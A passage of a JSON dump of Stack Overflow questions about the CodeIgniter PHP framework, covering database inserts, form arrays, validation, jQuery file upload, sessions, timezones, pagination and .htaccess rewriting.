'email' =&gt; $this -&gt; input -&gt; post('email_address'),\n        'password' =&gt; $this -&gt; input -&gt; post('password'),\n    );\n    $this -&gt; db -&gt; insert('user', $data);\n}\n}\n</code></pre>\n"},{"tags":["database","codeigniter","insert","set"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":13030700,"title":"Codeigniter set value in database error","body":"<p>id\nans1_r\nans2_r\nans3_r\nans4_r\nans5_r\nans6_r</p>\n\n<p>I have these fields in <strong>anketemale</strong>  table. All fields are integers.</p>\n\n<p><strong><code>$answer</code> is the column name. <code>$id</code> is the id of chosen row.</strong>\nSo I want to make +1 in specific row and just one of the ans fields. I wrote this code:</p>\n\n<pre><code>function upisi_malu($id,$answer)\n    {\n        $anketadb = $this-&gt;load-&gt;database('anketa',TRUE);\n\n    $anketadb-&gt;select($answer);\n    $anketadb-&gt;where('id', $id); \n    $q = $anketadb-&gt;get('anketemale');\n\n    foreach ($q-&gt;result() as $row)\n    {\n    $ans = $row-&gt;$answer + 1;\n    }\n    echo $answer; //just to know I echo them, and values are right\n    echo $ans;\n    echo $id;\n    $anketadb-&gt;set($answer, $ans); \n    $anketadb-&gt;where('id', $id); \n    $anketadb-&gt;insert('anketemale'); \n}\n</code></pre>\n\n<p>Why does this code write every change in new row? I just want to change row what already exist.</p>\n"},{"tags":["database","arrays","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":75,"score":1,"question_id":12944077,"title":"CodeIgniter - Writing input array to database","body":"<p>I am trying to grab the data from an array of input fields and write them to a database. I have never worked with arrays before but this is the code I have. It is based off what I would do if it was just a single input value. I know this is wrong but I have no idea what to try next. Any ideas? Thanks.</p>\n\n<pre><code>//view\n&lt;input type=\"text\" name=\"assignments[]\"&gt;\n&lt;input type=\"text\" name=\"hours[]\"&gt;\n\n&lt;input type=\"text\" name=\"assignments[]\"&gt;\n&lt;input type=\"text\" name=\"hours[]\"&gt;\n\n&lt;input type=\"text\" name=\"assignments[]\"&gt;\n&lt;input type=\"text\" name=\"hours[]\"&gt;\n\n&lt;input type=\"text\" name=\"assignments[]\"&gt;\n&lt;input type=\"text\" name=\"hours[]\"&gt;\n\n&lt;input type=\"text\" name=\"assignments[]\"&gt;\n&lt;input type=\"text\" name=\"hours[]\"&gt;\n\n//controller\n$assignments = $this-&gt;input-&gt;post('assignments', TRUE);\n$hours = $this-&gt;input-&gt;post('hours', TRUE);\n\n$this-&gt;load-&gt;model('create', 'create_model');\n$this-&gt;create_model-&gt;create_projects($assignments, $hours);\n\n//model\npublic function create_projects($assignments, $hours) {\n\n    $data = array(\n        'assignments' =&gt; $assignments,\n        'hours' =&gt; $hours,\n        );\n    $this-&gt;db-&gt;insert('projects', $data);\n}\n</code></pre>\n"},{"tags":["php","validation","codeigniter","frameworks"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":74,"score":0,"question_id":13005108,"title":"How to access array field name value in the validation callback function?","body":"<p>I got some text inputs in my view:</p>\n\n<pre><code>&lt;label for=\"car-n\"&gt;Car Name:&lt;/label&gt;&lt;input type=\"text\" name=\"cars[]\" id=\"car-n\"/&gt;\n&lt;label for=\"car-t\"&gt;Car Type:&lt;/label&gt;&lt;input type=\"text\" name=\"cars[]\" id=\"car-t\"/&gt;\n</code></pre>\n\n<p>And now, I would like to validate them with the CodeIgniter's validation callback function, but it seems like I can not get their values:</p>\n\n<p><code>$this-&gt;form_validation-&gt;set_rules('cars[]', 'Cars', 'required|xss_clean|callback__validate_cars');</code></p>\n\n<p>... and the function:</p>\n\n<pre><code>function _validate_cars($input)\n{\n     echo $input; //returns no field value;\n     echo $this-&gt;form_validation-&gt;set_value('cars[]'); //not works\n}\n</code></pre>\n\n<p>So, how should I access those two field values in my callback function then? I havent seen any informations about this case in the CodeIgniters user guide.</p>\n"},{"tags":["php","database","codeigniter","mysqli"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":79,"score":0,"question_id":12462292,"title":"Codeigniter - Create two or more result objects from single query","body":"<p>Please look at this code:</p>\n\n<pre><code>$query = $this-&gt;db-&gt;query(\"SELECT * FROM comments c LEFT JOIN users u ON u.user_id = c.user_id\");\nforeach ($query-&gt;result('Comment') as $comment)\n{\n// $comment holds all data from both tables\n}\n</code></pre>\n\n<p>So, what I want is to have two objects <code>$comment</code> (only with columns from comments table as object properties) and <code>$user</code> for that comment. <strong>Is there any simple way to get that?</strong></p>\n\n<p>Please note that this is general question and I need all columns from both tables and sometimes columns in one table can have names as columns in other tables.</p>\n"},{"tags":["php","jquery","codeigniter","jquery-ajax"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":3571,"score":1,"question_id":9088270,"title":"jQuery Image Upload - CodeIgniter","body":"<p>I use jQuery Image upload like this <a href=\"http://blueimp.github.com/jQuery-File-Upload/\" rel=\"nofollow\">http://blueimp.github.com/jQuery-File-Upload/</a></p>\n\n<p>I get the thumbnail and after clicking the upload button I get the progress bar, but then get 'SyntaxError: JSON.parse: unexpected character'</p>\n\n<p>view page</p>\n\n<pre><code>&lt;/body&gt;\n&lt;/html&gt;\n&lt;head&gt;\n&lt;meta charset=\"utf-8\"&gt;\n&lt;title&gt;jQuery File Upload Demo&lt;/title&gt;\n\n&lt;link rel=\"stylesheet\" href=\"http://twitter.github.com/bootstrap/1.4.0/bootstrap.min.css\"&gt;\n&lt;link rel=\"stylesheet\" href=\"http://blueimp.github.com/Bootstrap-Image-Gallery/bootstrap-image-gallery.min.css\"&gt;\n&lt;!--[if lt IE 7]&gt;&lt;link rel=\"stylesheet\" href=\"http://blueimp.github.com/Bootstrap-Image-Gallery/bootstrap-ie6.min.css\"&gt;&lt;![endif]--&gt;\n&lt;link rel=\"stylesheet\" href=\"http://blueimp.github.com/jQuery-File-Upload/jquery.fileupload-ui.css\"&gt;\n&lt;style type=\"text/css\"&gt;body {padding-top: 80px;}&lt;/style&gt;\n&lt;meta name=\"description\" content=\"File Upload widget with multiple file selection, drag&amp;amp;drop support, progress bar and preview images for jQuery. Supports cross-domain, chunked and resumable file uploads. Works with any server-side platform (Google App Engine, PHP, Python, Ruby on Rails, Java, etc.) that supports standard HTML form file uploads.\"&gt;\n&lt;/head&gt;\n&lt;body&gt;\n\n&lt;div class=\"container\"&gt;\n\n\n    &lt;?php echo form_open_multipart('upload/do_upload', array('id'=&gt;'fileupload')); ?&gt;\n\n\n        &lt;div class=\"row\"&gt;\n            &lt;div class=\"span16 fileupload-buttonbar\"&gt;\n                &lt;div class=\"progressbar fileupload-progressbar fade\"&gt;&lt;div style=\"width:0%;\"&gt;&lt;/div&gt;&lt;/div&gt;\n                &lt;span class=\"btn success fileinput-button\"&gt;\n                    &lt;span&gt;Add files...&lt;/span&gt;\n                    &lt;input type=\"file\" name=\"userfile[]\" multiple&gt;\n                &lt;/span&gt;\n                &lt;button type=\"submit\" class=\"btn primary start\"&gt;Start upload&lt;/button&gt;\n                &lt;button type=\"reset\" class=\"btn info cancel\"&gt;Cancel upload&lt;/button&gt;\n                &lt;button type=\"button\" class=\"btn danger delete\"&gt;Delete selected&lt;/button&gt;\n                &lt;input type=\"checkbox\" class=\"toggle\"&gt;\n            &lt;/div&gt;\n        &lt;/div&gt;\n        &lt;br&gt;\n        &lt;div class=\"row\"&gt;\n            &lt;div class=\"span16\"&gt;\n                &lt;table class=\"zebra-striped\"&gt;&lt;tbody class=\"files\"&gt;&lt;/tbody&gt;&lt;/table&gt;\n            &lt;/div&gt;\n        &lt;/div&gt;\n    &lt;/form&gt;\n\n&lt;/div&gt;\n&lt;!-- gallery-loader is the loading animation container --&gt;\n&lt;div id=\"gallery-loader\"&gt;&lt;/div&gt;\n&lt;!-- gallery-modal is the modal dialog used for the image gallery --&gt;\n&lt;div id=\"gallery-modal\" class=\"modal hide fade\"&gt;\n    &lt;div class=\"modal-header\"&gt;\n        &lt;a href=\"#\" class=\"close\"&gt;&amp;times;&lt;/a&gt;\n        &lt;h3 class=\"title\"&gt;&lt;/h3&gt;\n    &lt;/div&gt;\n    &lt;div class=\"modal-body\"&gt;&lt;/div&gt;\n    &lt;div class=\"modal-footer\"&gt;\n        &lt;a class=\"btn primary next\"&gt;Next&lt;/a&gt;\n        &lt;a class=\"btn info prev\"&gt;Previous&lt;/a&gt;\n        &lt;a class=\"btn success download\" target=\"_blank\"&gt;Download&lt;/a&gt;\n    &lt;/div&gt;\n&lt;/div&gt;\n&lt;script&gt;\nvar fileUploadErrors = {\n    maxFileSize: 'File is too big',\n    minFileSize: 'File is too small',\n    acceptFileTypes: 'Filetype not allowed',\n    maxNumberOfFiles: 'Max number of files exceeded',\n    uploadedBytes: 'Uploaded bytes exceed file size',\n    emptyResult: 'Empty file upload result'\n};\n\n&lt;/script&gt;\n&lt;script id=\"template-upload\" type=\"text/html\"&gt;\n{% for (var i=0, files=o.files, l=files.length, file=files[0]; i&lt;l; file=files[++i]) { %}\n    &lt;tr class=\"template-upload fade\"&gt;\n        &lt;td class=\"preview\"&gt;&lt;span class=\"fade\"&gt;&lt;/span&gt;&lt;/td&gt;\n        &lt;td class=\"name\"&gt;{%=file.name%}&lt;/td&gt;\n        &lt;td class=\"size\"&gt;{%=o.formatFileSize(file.size)%}&lt;/td&gt;\n        {% if (file.error) { %}\n            &lt;td class=\"error\" colspan=\"2\"&gt;&lt;span class=\"label important\"&gt;Error&lt;/span&gt; {%=fileUploadErrors[file.error] || file.error%}&lt;/td&gt;\n        {% } else if (o.files.valid &amp;&amp; !i) { %}\n            &lt;td class=\"progress\"&gt;&lt;div class=\"progressbar\"&gt;&lt;div style=\"width:0%;\"&gt;&lt;/div&gt;&lt;/div&gt;&lt;/td&gt;\n            &lt;td class=\"start\"&gt;{% if (!o.options.autoUpload) { %}&lt;button class=\"btn primary\"&gt;Start&lt;/button&gt;{% } %}&lt;/td&gt;\n        {% } else { %}\n            &lt;td colspan=\"2\"&gt;&lt;/td&gt;\n        {% } %}\n        &lt;td class=\"cancel\"&gt;{% if (!i) { %}&lt;button class=\"btn info\"&gt;Cancel&lt;/button&gt;{% } %}&lt;/td&gt;\n    &lt;/tr&gt;\n{% } %}\n&lt;/script&gt;\n&lt;script id=\"template-download\" type=\"text/html\"&gt;\n{% for (var i=0, files=o.files, l=files.length, file=files[0]; i&lt;l; file=files[++i]) { %}\n    &lt;tr class=\"template-download fade\"&gt;\n        {% if (file.error) { %}\n            &lt;td&gt;&lt;/td&gt;\n            &lt;td class=\"name\"&gt;{%=file.name%}&lt;/td&gt;\n            &lt;td class=\"size\"&gt;{%=o.formatFileSize(file.size)%}&lt;/td&gt;\n            &lt;td class=\"error\" colspan=\"2\"&gt;&lt;span class=\"label important\"&gt;Error&lt;/span&gt; {%=fileUploadErrors[file.error] || file.error%}&lt;/td&gt;\n        {% } else { %}\n            &lt;td class=\"preview\"&gt;{% if (file.thumbnail_url) { %}\n                &lt;a href=\"{%=file.url%}\" title=\"{%=file.name%}\" rel=\"gallery\"&gt;&lt;img src=\"{%=file.thumbnail_url%}\"&gt;&lt;/a&gt;\n            {% } %}&lt;/td&gt;\n            &lt;td class=\"name\"&gt;\n                &lt;a href=\"{%=file.url%}\" title=\"{%=file.name%}\" rel=\"{%=file.thumbnail_url&amp;&amp;'gallery'%}\"&gt;{%=file.name%}&lt;/a&gt;\n            &lt;/td&gt;\n            &lt;td class=\"size\"&gt;{%=o.formatFileSize(file.size)%}&lt;/td&gt;\n            &lt;td colspan=\"2\"&gt;&lt;/td&gt;\n        {% } %}\n        &lt;td class=\"delete\"&gt;\n            &lt;button class=\"btn danger\" data-type=\"{%=file.delete_type%}\" data-url=\"{%=file.delete_url%}\"&gt;Delete&lt;/button&gt;\n            &lt;input type=\"checkbox\" name=\"delete\" value=\"1\"&gt;\n        &lt;/td&gt;\n    &lt;/tr&gt;\n{% } %}\n&lt;/script&gt;\n&lt;script src=\"//ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js\"&gt;&lt;/script&gt;\n&lt;!-- The jQuery UI widget factory, can be omitted if jQuery UI is already included --&gt;\n&lt;script src=\"http://blueimp.github.com/jQuery-File-Upload/vendor/jquery.ui.widget.js\"&gt;&lt;/script&gt;\n&lt;!-- The Templates and Load Image plugins are included for the FileUpload user interface --&gt;\n&lt;script src=\"http://blueimp.github.com/JavaScript-Templates/tmpl.min.js\"&gt;&lt;/script&gt;\n&lt;script src=\"http://blueimp.github.com/JavaScript-Load-Image/load-image.min.js\"&gt;&lt;/script&gt;\n&lt;!-- Bootstrap Modal and Image Gallery are not required, but included for the demo --&gt;\n&lt;script src=\"http://twitter.github.com/bootstrap/1.4.0/bootstrap-modal.min.js\"&gt;&lt;/script&gt;\n\n&lt;script src=\"http://blueimp.github.com/Bootstrap-Image-Gallery/bootstrap-image-gallery.min.js\"&gt;&lt;/script&gt;\n&lt;!-- The Iframe Transport is required for browsers without support for XHR file uploads --&gt;\n&lt;script src=\"http://blueimp.github.com/jQuery-File-Upload/jquery.iframe-transport.js\"&gt;&lt;/script&gt;\n&lt;script src=\"http://blueimp.github.com/jQuery-File-Upload/jquery.fileupload.js\"&gt;&lt;/script&gt;\n&lt;script src=\"http://blueimp.github.com/jQuery-File-Upload/jquery.fileupload-ui.js\"&gt;&lt;/script&gt;\n&lt;script src=\"http://blueimp.github.com/jQuery-File-Upload/application.js\"&gt;&lt;/script&gt;\n&lt;!-- The XDomainRequest Transport is included for cross-domain file deletion for IE8+ --&gt;\n&lt;!--[if gte IE 8]&gt;&lt;script src=\"http://blueimp.github.com/jQuery-File-Upload/cors/jquery.xdr-transport.js\"&gt;&lt;/script&gt;&lt;![endif]--&gt;\n\n\n&lt;/body&gt; \n&lt;/html&gt;\n</code></pre>\n\n<p>controller page:</p>\n\n<pre><code>class upload extends CI_Controller {\n\n    function __construct()\n    {\n        parent::__construct();\n        $this-&gt;load-&gt;helper(array('form', 'url'));\n\n\n\n    }\n\n    function index()\n    {    \n        $this-&gt;load-&gt;view('index');\n    }\n\n    function do_upload()\n    {\n        $config['upload_path'] = './uploads/'; // server directory\n        $config['allowed_types'] = 'gif|jpg|png'; // by extension, will check for whether it is an image\n        $config['max_size']    = '1000'; // in kb\n        $config['max_width']  = '1024';\n        $config['max_height']  = '768';\n\n        $this-&gt;load-&gt;library('upload', $config);\n        $this-&gt;load-&gt;library('Multi_upload');\n\n        $files = $this-&gt;multi_upload-&gt;go_upload();\n\n        if ( ! $files )        \n        {\n            $error = array('error' =&gt; $this-&gt;upload-&gt;display_errors());\n            $this-&gt;load-&gt;view('index', $error);\n        }    \n        else\n        {\n            $data = array('upload_data' =&gt; $files);\n            $this-&gt;load-&gt;view('upload_success', $data);\n        }\n    }    \n}\n</code></pre>\n\n<p>Any Help?</p>\n"},{"tags":["codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":13030993,"title":"How to change the value of a button after validating form with codeigniter","body":"<p>I'm building a CRUD system with codeigniter.</p>\n\n<p>The user selects an item, and its details are queried from the db, and populate the form fields.</p>\n\n<p>The user can then decide if they want to update that item, or duplicate it and create a new item.</p>\n\n<p>I wanted the duplication to happen like this:\nAfter clicking the <em>Duplicate</em> button, the value of the item code will be cleared (since the item code is unique, and is user-generated), and the value of the <em>Duplicate</em> button will change to <em>Create a New Item</em>. The user should then type the new item code, and click the <em>Create a New Item</em> button.</p>\n\n<p>The above is easily achieved with Javascript.</p>\n\n<p>Then the form is submitted, and gets validated using CI's form_validation library.</p>\n\n<p>If the validation fails, I'm reloading the form, displaying the error messages.</p>\n\n<p>Again, that part is easily achieved using CI's form_validation.</p>\n\n<p><strong>My problem lies here:</strong>\nAfter reloading the failed form with the error messages, I want the value of the <em>Duplicate</em> button to remain <em>Create a New Item</em>, and not reset to the initial <em>Duplicate</em> value.</p>\n\n<p>How can I set the <strong>value</strong> of a button after returning the error messages to the form?</p>\n"},{"tags":["php","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":52,"score":-2,"question_id":13028892,"title":"How do i tackle a situation where in i need to use same functions in multiple places","body":"<p>I am creating a order fulfillment system for mu E-commerce system. I am stuck in a situation. Every 1 hour 1 cron job runs and it assigns ware house and does other processes.So this is a class where i do 1 full process. I need to give option for user to do each of them individually also manually i.e. assign warehouse manually etc. So this warehouse functions will be used in multiple places i.e in cron class and warehouse class. So should i create these functions in 1 library like warehouse.php or else in cron class create instance of each class and call its functions? i am using Codeigniter.</p>\n\n<p>Hope below code makes my self clear. So should i create a warehouse library or a controller is my question.\nMain question is to use like this</p>\n\n<pre><code>class cron extends CI_Controller{\n\nfunction index(){\n$this-&gt;load-&gt;library('blacklist');\n$this-&gt;load-&gt;library('warehouse');\n$this-&gt;load-&gt;library('lsp');\n$this-&gt;blacklist-&gt;function1();\n$this-&gt;warehouse-&gt;function2();\n}\n}\n\nor \n\nclass cron extends CI_Controller{\n\nfunction index(){\n$blacklist = new blacklist();\n$warehouse = new warehouse();\n$lsp  = new lsp();\n$blacklist-&gt;function1();\n$warehouse-&gt;function2();\n\n}\n}\n</code></pre>\n"},{"tags":["php","mysql","codeigniter","e-commerce","temporary-table"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":58,"score":2,"question_id":12677100,"title":"Temporary Table not always available in Code Igniter?","body":"<p>Code Igniter - PHP - Mysql.\nI am working on a Shopping Website, and due to the large number of Products and Client Pricing Options for each Product (inclusion of Discounts at a different rate for each user etc), have created a temporary table when a Client Logs in. \nThe table is creating successfully, however as I navigate thru the site it doesnt always remain persistent.</p>\n\n<p>For eg, If i have a query saying \"Select * From Temp_Products\" running on each page of the site, it returns an empty set or says Temp_Products doesnt exist on some pages.</p>\n\n<p>I am unable to figure out where the problem is, there seems to be no specific pattern or trigger causing this.</p>\n\n<p>Also, how do e-commerce sites usually implement catalogues &amp; inventry? Any info would be helpful!!</p>\n\n<p>Thanks !</p>\n"},{"tags":["php","codeigniter","paypal"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":61,"score":1,"question_id":12949431,"title":"Paypal adaptive method in php and codeigniter","body":"<p>I am using Codeigniter and implementing the paypal delayed chained adaptive method. I have completed first leg successfully. The payment is going to primary receiver, but when I use the Execute Payment by passing the PayKey, this is giving me following error result:</p>\n\n<pre><code>Array (\n        [Receiver] =&gt; \n        [Category] =&gt; Application\n        [Domain] =&gt; PLATFORM\n        [ErrorID] =&gt; 550001\n        [ExceptionID] =&gt; \n        [Message] =&gt; This payment request must be authorized by the sender\n        [Parameter] =&gt; \n        [Severity] =&gt; Error\n        [Subdomain] =&gt; Application\n    )\n</code></pre>\n"},{"tags":["codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":13014706,"title":"Codeigniter Cart - Check if item added to cart","body":"<p>I'm using the Cart class in Codeigniter. What I want to do should (hopefully!) be simple... but i'm struggling.</p>\n\n<p>On the product page, I have a button to 'add to cart'. What I want to happen is that when the item is already in the cart, the button changes to 'remove from cart'.</p>\n\n<pre><code>&lt;? //if(**not in cart**) { ?&gt;\n    &lt;a href=\"&lt;?=base_url()?&gt;jobs/addjob/&lt;?=$row-&gt;id?&gt;\"&gt;Add to cart&lt;/a&gt;\n&lt;? } else { ?&gt;\n    &lt;a href=\"&lt;?=base_url()?&gt;jobs/removejob/&lt;? /**cart 'rowid'**/ echo $rowid?&gt;\"&gt;Remove from cart&lt;/a&gt;\n&lt;? } ?&gt;\n</code></pre>\n\n<p>How can I query the cart to see if that item is in there or not and get the 'rowid' so I can use that for a remove function?</p>\n\n<p>Many thanks!</p>\n"},{"tags":["php","codeigniter"],"answer_count":4,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":13026857,"title":"codeigniter and timezones","body":"<p>I am based in the UK but my site runs on a server in america. Some of the dates that go into the database reflect the server time and some reflect the UK time. I am confused how this happens.</p>\n\n<p>I have set the timezone in the codeigniter index.php file using <code>date_default_timezone_set('Europe/Dublin');</code> It seems to work for some controllers and not for others.</p>\n\n<p>Any recommendations on where to look for the problem. Should i use the timezone function in the constructor of every controller?</p>\n"},{"tags":["javascript","codeigniter","checkbox","delete","multiple"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":1,"view_count":456,"score":-1,"question_id":11699554,"title":"delete rows from table corresponding to selected checkboxes on click on delete","body":"<p>I am using codeigniter framework for my website. In views i have a php file which displays a table like this</p>\n\n<pre><code>            #        Name\n\ncheckbox    1   Aanchal \n\n\ncheckbox    2   Abhijeet \n</code></pre>\n\n<p>Now i want to get id of all the selected checkboxes (can be multiple also) such that when the user click on delete button present in navigation bar, the selected entries get deleted.</p>\n\n<p>Here is the code i am using in views:</p>\n\n<pre><code>&lt;header class=\"jumbotron subhead\" id=\"overview\"&gt;\n    &lt;div class=\"subnav\"&gt;\n    &lt;ul class=\"nav nav-pills\"&gt;\n        &lt;li&gt;&lt;a href=\"controller 1\"&gt;Home&lt;/a&gt;&lt;/li&gt;\n        &lt;li&gt;&lt;a href=\"controller 2\"&gt;Add&lt;/a&gt;&lt;/li&gt;\n        &lt;li&gt;&lt;a href=\"controller 3\"&gt;Edit&lt;/a&gt;&lt;/li&gt;\n        &lt;li&gt;&lt;a href=\"controller 4\"&gt;Delete&lt;/a&gt;&lt;/li&gt;\n    &lt;/ul&gt;\n    &lt;/div&gt;\n&lt;/header&gt;\n\n&lt;div id=\"content\" style=\"height: 500px; width: 800px\"&gt;\n    &lt;table class=\"table table-striped\"&gt;\n        &lt;thead&gt;\n        &lt;tr&gt;\n        &lt;th&gt;&lt;/th&gt;\n        &lt;th&gt;#&lt;/th&gt;\n        &lt;th&gt;Name&lt;/th&gt;\n        &lt;/tr&gt;\n        &lt;/thead&gt;\n        &lt;tbody&gt;\n            &lt;?php\n        for($i=0;$i&lt;sizeof($json_string);$i++)\n        {       \n            $sno = $i + 1;\n        ?&gt;\n        &lt;tr&gt;\n        &lt;td&gt;&lt;input type=\"checkbox\" id=&lt;?php $sno?&gt; value=&lt;?php $sno?&gt; /&gt;&lt;br /&gt;\n        &lt;/td&gt;\n        &lt;td&gt;&lt;?php print_r($sno)?&gt;&lt;/td&gt;\n        &lt;td&gt;&lt;?php print_r($json_string[$i]-&gt;fName);\n        if(isset($json_string[$i]-&gt;lName))\n        {\n            print_r($json_string[$i]-&gt;lName);\n        }\n        else\n            print_r(\"\");\n        ?&gt;\n        &lt;/td&gt;\n    &lt;/tbody&gt;\n        &lt;/table&gt;\n</code></pre>\n\n<p>controller 4 will be having code to delete the selected entries from string, so what should i do to get and pass the selected checkboxes' ids to controller 4</p>\n"},{"tags":["php","codeigniter","session"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":52,"score":2,"question_id":13025836,"title":"What to do when php session does not continue in another controller in codeigniter?","body":"<p>I'm developing a web app using codeigniter but I prefer to shy off from handling sessions the codeigniter way due to the bugs it's associated with.Therefore I'm using native php session handling. The problem I'm having is that it seems the session which is started from the default controller doesn't continue in other controllers and it's a pain in the neck. \nIn both my default controller and the other controllers, I've started or continued the session way on top, before any other code like this:</p>\n\n<pre><code>&lt;?php\n@session_start();\n</code></pre>\n\n<p>So what do I do to make the session continue in the other controllers instead of being confined in the default controller?</p>\n"},{"tags":["codeigniter","checkbox","php-frameworks"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":122,"score":-2,"question_id":12297276,"title":"Codeigniter: Click on a link then get value from checked checkboxes to pass to controller","body":"<p>I have three menus(ADD, EDIT, DELETE), and many items with checkboxs. I checked some checkboxs then when i click on DELETE, I want to delete all the checked items. I just don't know how can i detect which checkboxs are checked with codeigniter. Anyone have any ideas?</p>\n"},{"tags":["php","codeigniter"],"answer_count":6,"favorite_count":1,"up_vote_count":6,"down_vote_count":0,"view_count":22006,"score":6,"question_id":1060733,"title":"CodeIgniter - Loading CSS","body":"<p>I am developing an custom API for a web solution and I am using the MVC design pattern.  I have a modules folder so that I can swap in and out modules and also work on sections without disrupting working tested code.  My only issue now is that I want to load CSS anywhere and have my application properly import the css file in the head tag.  I know CodeIgniter does this but I'm not sure how.</p>\n\n<p>Using PHP, how do I load in a CSS file anywhere and then have the code properly import the css within the head tags like CodeIgniter does?</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["php","jquery","codeigniter"],"answer_count":1,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":66,"score":3,"question_id":13025338,"title":"CodeIgniter / jQuery - Pagination - Endless Pagination","body":"<p>Im trying to implement the endless pagination jquery plugin found here ( <a href=\"https://github.com/jney/jquery.pageless\" rel=\"nofollow\">https://github.com/jney/jquery.pageless</a> ) into my codeigniter project.</p>\n\n<p>The jquery code i enter is the same as whats on the demo page</p>\n\n<pre><code>$('#results').pageless({ totalPages: 10\n, url: '/theurl/index'\n, loaderMsg: 'Loading more results'\n});\n</code></pre>\n\n<p>and the code i have in my codeigniter controller is as follows</p>\n\n<pre><code>    $config['base_url'] = base_url() . 'theurl/index';\n    $config['total_rows'] = $this-&gt;model-&gt;record_count();\n    $config['per_page'] = 20;\n    $config['uri_segment'] = 3;\n\n    // Init the config\n    $this-&gt;pagination-&gt;initialize( $config );\n\n    // Create pagination\n    $page = ($this-&gt;uri-&gt;segment(3)) ? $this-&gt;uri-&gt;segment(3) : 0;\n    $data['results'] = $this-&gt;onyafeet-&gt;fetch_results($config['per_page'], $page);\n    $data['links'] = $this-&gt;pagination-&gt;create_links();\n\n    // Load the view and pass through all the data\n    $this-&gt;load-&gt;view('theurl/index', $data);\n</code></pre>\n\n<p>When i run the code, and reach the bottom of the page, it does work, but it also loads the enter page into the new div it creates just for the results.</p>\n\n<p>Any help would be greatly appreciated.</p>\n\n<p>Cheers</p>\n"},{"tags":["php","codeigniter","select"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":78,"score":0,"question_id":13025253,"title":"Get Values from Multiple select Box In Codeigniter","body":"<p>I  have a multiple select box:</p>\n\n<pre><code>&lt;select name=\"tar[]\" multiple=\"multiple\" style=\"height:100px;\" id=\"select1\"&gt;\n            &lt;?php foreach($lists as $list){ ?&gt;\n            &lt;option value=\"&lt;?php echo $list['des_id']; ?&gt;\"&gt;&lt;?php echo $list['designation']; ?&gt;&lt;/option&gt;\n            &lt;?php } ?&gt;\n\n            &lt;/select&gt;\n</code></pre>\n\n<p>At controller i am trying to get the values of selected fields,but failed to get that and i am getting values like 2 or 3.</p>\n\n<pre><code>$target = $this-&gt;input-&gt;post('tar');\n                  print_r($target);die;\n</code></pre>\n\n<p>Am i doing right??please guide me.Thanks.</p>\n"},{"tags":["php","codeigniter","jquery-ajax","file-upload"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":70,"score":0,"question_id":13023891,"title":"upload image using ajax","body":"<p>I have the following html form. Here the image upload is working fine. But i want to make the image upload in ajax so that before submitting the form with other details. The preview of the image can be shown in side.</p>\n\n<pre><code>&lt;form action=\"&lt;?=base_url();?&gt;index.php/insert/insertdata\" method=\"post\" enctype=\"multipart/form-data\"&gt;\n\n        &lt;tr&gt;&lt;td&gt;&lt;b&gt;Title: &lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=\"text\" name=\"title\"/&gt;&lt;/td&gt;&lt;/tr&gt;\n        &lt;tr&gt;&lt;td&gt;&lt;b&gt;Url: &lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=\"text\" name=\"url\"/&gt;&lt;/td&gt;&lt;/tr&gt;\n\n        &lt;tr&gt;&lt;td&gt;&lt;b&gt;Image: &lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=\"file\" name=\"image\"&gt;&lt;/td&gt;&lt;/tr&gt;\n\n        &lt;tr&gt;&lt;td&gt;&lt;b&gt;Status: &lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;select name=\"status\"&gt;&lt;option value=\"visible\"&gt;Visible&lt;/option&gt;&lt;option value=\"invisible\"&gt;Invisible&lt;/option&gt;&lt;/select&gt;&lt;/td&gt;&lt;/tr&gt;  \n\n        &lt;tr&gt;&lt;td&gt;&lt;input type=\"submit\" value=\"submit\"/&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=\"reset\" value=\"reset\"/&gt;&lt;/td&gt;&lt;/tr&gt;\n    &lt;/form&gt;\n</code></pre>\n\n<p>jquery is also welcome. But I would like to avoid using the form tag again.</p>\n"},{"tags":[".htaccess","codeigniter","url-rewriting","codeigniter-url"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":13018431,"title":"How to remove application folder name in code igniter","body":"<pre><code>    &lt;IfModule mod_rewrite.c&gt;\n    RewriteEngine On\n    RewriteBase /\n\n    #Removes access to the system folder by users.\n    #Additionally this will allow you to create a System.php controller,\n    #previously this would not have been possible.\n    #'system' can be replaced if you have renamed your system folder.\n    RewriteCond %{REQUEST_URI} ^system.*\n    RewriteRule ^(.*)$ /index.php?/$1 [L]\n\n    #When your application folder isn't in the system folder\n    #This snippet prevents user access to the application folder\n    #Submitted by: Fabdrol\n    #Rename 'application' to your applications folder name.\n    RewriteCond %{REQUEST_URI} ^main.*\n    RewriteRule ^(.*)$ /index.php?/$1 [L]\n\n    #Checks to see if the user is attempting to access a valid file,\n    #such as an image or css document, if this isn't true it sends the\n    #request to index.php\n    RewriteCond %{REQUEST_FILENAME} !-f\n    RewriteCond %{REQUEST_FILENAME} !-d\n    RewriteRule ^(.*)$ index.php?/$1 